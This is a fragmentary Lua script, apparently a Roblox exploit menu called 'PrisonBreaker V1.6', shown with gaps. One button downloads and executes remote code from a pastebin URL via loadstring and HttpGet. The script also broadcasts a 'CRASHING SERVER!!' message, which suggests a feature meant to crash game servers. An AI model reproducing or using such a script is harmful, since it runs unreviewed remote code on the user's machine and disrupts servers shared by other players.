...
openmain.Position = UDim2.new(0.0104873544, 0, 0.609140036, 0)
...
title.Text = "PrisonBreaker V1.6 Made By tomtygamingYT"
...
loadstring(game:HttpGet("https://pastebin.com/raw/Jq7dCBjK",true))()
end)
 
prisondestroyer.Name = "prisondestroyer"
prisondestroyer.Parent = guismain
prisondestroyer.BackgroundColor3 = Color3.new(0, 0, 0)
prisondestroyer.Position = UDim2.new(0.363184065, 0, 0.0406037744, 0)
...
local tbl_main = 
  {
    "CRASHING SERVER!! Script made by tomtygamingYT.", 
      "All"
      }
